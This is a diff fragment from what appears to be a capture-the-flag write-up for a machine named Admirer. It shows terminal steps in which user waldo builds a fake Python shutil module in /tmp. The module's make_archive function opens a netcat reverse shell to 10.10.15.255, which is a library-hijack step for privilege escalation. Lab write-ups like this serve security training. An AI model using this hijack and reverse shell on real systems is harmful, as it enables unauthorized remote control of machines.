@@ -144,3 +144,14 @@ exit 0
 .
 .
 .
+waldo@admirer:~$ cd /tmp
+waldo@admirer:/tmp$ mkdir fakeshutil
+waldo@admirer:/tmp$ cd fakeshutil/
+waldo@admirer:/tmp/fakeshutil$ vim shutil.py
+-bash: vim: command not found
+waldo@admirer:/tmp/fakeshutil$ nano shutil.py
+waldo@admirer:/tmp/fakeshutil$ cat shutil.py
+import os 
+
+def make_archive(a, b, c): 
+        os.system('nc 10.10.15.255 1234 -e "/bin/sh"')
